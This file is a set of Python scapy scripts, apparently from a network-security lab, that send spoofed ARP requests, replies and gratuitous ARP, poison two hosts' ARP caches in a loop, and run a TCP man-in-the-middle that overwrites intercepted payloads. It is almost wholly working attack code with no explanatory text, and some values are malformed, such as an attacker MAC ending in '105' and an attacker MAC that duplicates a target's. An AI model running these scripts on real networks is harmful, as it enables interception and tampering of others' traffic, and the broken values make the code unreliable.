
//arp_gratuitous.py
#!/usr/bin/env python3
from scapy.all import *

def send_gratuitous_arp(ip, mac):
    packet = ARP(op=2, hwsrc=mac, psrc=ip, hwdst='ff:ff:ff:ff:ff:ff', pdst=ip)
    send(packet, verbose=False)
    print(f"Gratuitous ARP sent for IP: {ip}, MAC: {mac}")

if __name__ == "__main__":
    attacker_ip = "10.9.0.105"
    attacker_mac = "02:42:0a:09:00:05"
    send_gratuitous_arp(attacker_ip, attacker_mac)

//arp_poisoning_mitm.py
#!/usr/bin/env python3
from scapy.all import *
import time

def poison_arp_cache(target_ip, target_mac, spoof_ip, attacker_mac):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)
    send(packet, verbose=False)

if __name__ == "__main__":
    target_a_ip = "10.9.0.5"
    target_a_mac = "02:42:0a:09:00:05"
    target_b_ip = "10.9.0.6"
    target_b_mac = "02:42:0a:09:00:06"
    attacker_mac = "02:42:0a:09:00:105"

    while True:
        poison_arp_cache(target_a_ip, target_a_mac, target_b_ip, attacker_mac)
        poison_arp_cache(target_b_ip, target_b_mac, target_a_ip, attacker_mac)
        time.sleep(2)

//arp_reply.py
#!/usr/bin/env python3
from scapy.all import *

def send_arp_reply(target_ip, target_mac, spoof_ip, attacker_mac):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)
    send(packet, verbose=False)
    print(f"ARP Reply sent to {target_ip}, spoofing {spoof_ip}")

if __name__ == "__main__":
    target_ip = "10.9.0.5"
    target_mac = "02:42:0a:09:00:05"
    spoof_ip = "10.9.0.6"
    attacker_mac = "02:42:0a:09:00:105"
    send_arp_reply(target_ip, target_mac, spoof_ip, attacker_mac)

//arp_request.py
#!/usr/bin/env python3
from scapy.all import *

def send_arp_request(target_ip, attacker_ip, attacker_mac):
    packet = ARP(op=1, pdst=target_ip, hwsrc=attacker_mac, psrc=attacker_ip)
    send(packet, verbose=False)
    print(f"ARP Request sent to {target_ip} from {attacker_ip}")

if __name__ == "__main__":
    target_ip = "10.9.0.6"
    attacker_ip = "10.9.0.105"
    attacker_mac = "02:42:0a:09:00:05"
    send_arp_request(target_ip, attacker_ip, attacker_mac)


//mitm_tcp.py
#!/usr/bin/env python3
from scapy.all import *

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
        if pkt[TCP].payload:
            newdata = b"Z" * len(pkt[TCP].payload.load)
            send(newpkt / newdata)
        else:
            send(newpkt)
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt)

if __name__ == "__main__":
    sniff(iface="eth0", filter="tcp", prn=spoof_pkt)



